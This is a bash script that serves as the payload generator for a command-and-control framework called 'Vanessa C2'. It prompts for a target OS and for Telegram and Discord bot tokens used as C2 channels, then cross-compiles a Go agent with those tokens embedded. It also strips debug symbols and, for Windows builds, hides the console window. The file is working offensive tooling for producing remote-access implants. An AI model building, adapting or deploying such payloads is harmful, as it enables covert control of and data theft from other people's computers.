#!/bin/bash
# ═══════════════════════════════════════════
#  Vanessa C2 — Payload Generator
#  Cross-compiles Go agent with unique tokens
# ═══════════════════════════════════════════

set -e

# Colors
RED='\033[0;91m'
GREEN='\033[0;92m'
YELLOW='\033[0;93m'
CYAN='\033[0;96m'
BOLD='\033[1m'
RESET='\033[0m'

# Resolve project root (where this script lives)
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
CLIENT_DIR="$PROJECT_ROOT/client"
PAYLOAD_DIR="$HOME/.vanessa/payloads"

mkdir -p "$PAYLOAD_DIR"

echo -e "${CYAN}"
echo "  ╔════════════════════════════════════════╗"
echo "  ║  Vanessa C2 — Payload Generator        ║"
echo "  ╚════════════════════════════════════════╝"
echo -e "${RESET}"

# ── Collect target OS ─────────────────────
echo -e "${BOLD}Target OS:${RESET}"
echo "  1) windows  (.exe)"
echo "  2) linux    (ELF)"
echo ""
read -p "  Select [1/2]: " OS_CHOICE

case "$OS_CHOICE" in
    1|windows)
        TARGET_OS="windows"
        TARGET_EXT=".exe"
        ;;
    2|linux)
        TARGET_OS="linux"
        TARGET_EXT=""
        ;;
    *)
        echo -e "${RED}[!] Invalid choice. Use 1 or 2.${RESET}"
        exit 1
        ;;
esac

# ── Collect tokens ────────────────────────
echo ""
echo -e "${BOLD}Enter C2 tokens for this payload:${RESET}"
echo ""

read -p "  Telegram Bot Token: " TG_TOKEN
if [ -z "$TG_TOKEN" ]; then
    echo -e "${RED}[!] Telegram Bot Token is required.${RESET}"
    exit 1
fi

read -p "  Telegram Chat ID:   " TG_CHAT_ID
if [ -z "$TG_CHAT_ID" ]; then
    echo -e "${RED}[!] Telegram Chat ID is required.${RESET}"
    exit 1
fi

read -p "  Discord Bot Token:  " DC_TOKEN
if [ -z "$DC_TOKEN" ]; then
    echo -e "${RED}[!] Discord Bot Token is required.${RESET}"
    exit 1
fi

# ── Generate unique filename ─────────────
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_NAME="agent_${TARGET_OS}_${TIMESTAMP}${TARGET_EXT}"
OUTPUT_PATH="$PAYLOAD_DIR/$OUTPUT_NAME"

# ── Build ldflags ─────────────────────────
LDFLAGS="-s -w"
LDFLAGS="$LDFLAGS -X main.telegramToken=$TG_TOKEN"
LDFLAGS="$LDFLAGS -X main.telegramChatID=$TG_CHAT_ID"
LDFLAGS="$LDFLAGS -X main.discordToken=$DC_TOKEN"

# Add -H windowsgui for Windows (no console window)
if [ "$TARGET_OS" = "windows" ]; then
    LDFLAGS="$LDFLAGS -H windowsgui"
fi

echo ""
echo -e "${CYAN}[*] Cross-compiling agent for ${TARGET_OS}/amd64...${RESET}"

# ── Check if Docker builder image exists ──
if docker image inspect vanessa-agent-builder >/dev/null 2>&1; then
    # Use Docker builder
    echo -e "${CYAN}[*] Using Docker builder...${RESET}"
    docker run --rm \
        -v "$PAYLOAD_DIR:/output" \
        -e GOOS="$TARGET_OS" \
        -e GOARCH="amd64" \
        -e CGO_ENABLED=0 \
        vanessa-agent-builder \
        go build -ldflags="$LDFLAGS" -o "/output/$OUTPUT_NAME" .
else
    # Fall back to local Go compiler
    if ! command -v go &> /dev/null; then
        echo -e "${RED}[!] Neither Docker builder image nor local Go found.${RESET}"
        echo -e "${RED}    Run 'make install' first, or install Go 1.21+.${RESET}"
        exit 1
    fi

    echo -e "${YELLOW}[*] Docker builder not found — using local Go compiler...${RESET}"
    cd "$CLIENT_DIR"
    CGO_ENABLED=0 GOOS="$TARGET_OS" GOARCH=amd64 \
        go build -ldflags="$LDFLAGS" -o "$OUTPUT_PATH" .
fi

# ── Verify output ─────────────────────────
if [ ! -f "$OUTPUT_PATH" ]; then
    echo -e "${RED}[!] Build failed — output not found.${RESET}"
    exit 1
fi

FILE_SIZE=$(du -h "$OUTPUT_PATH" | cut -f1)
FILE_HASH=$(sha256sum "$OUTPUT_PATH" | cut -d' ' -f1)

echo ""
echo -e "${GREEN}  ╔════════════════════════════════════════╗"
echo -e "  ║  ✓ Payload Generated Successfully       ║"
echo -e "  ╚════════════════════════════════════════╝${RESET}"
echo ""
echo -e "  ${BOLD}File:${RESET}    $OUTPUT_PATH"
echo -e "  ${BOLD}OS:${RESET}      $TARGET_OS/amd64"
echo -e "  ${BOLD}Size:${RESET}    $FILE_SIZE"
echo -e "  ${BOLD}SHA256:${RESET}  $FILE_HASH"
echo ""
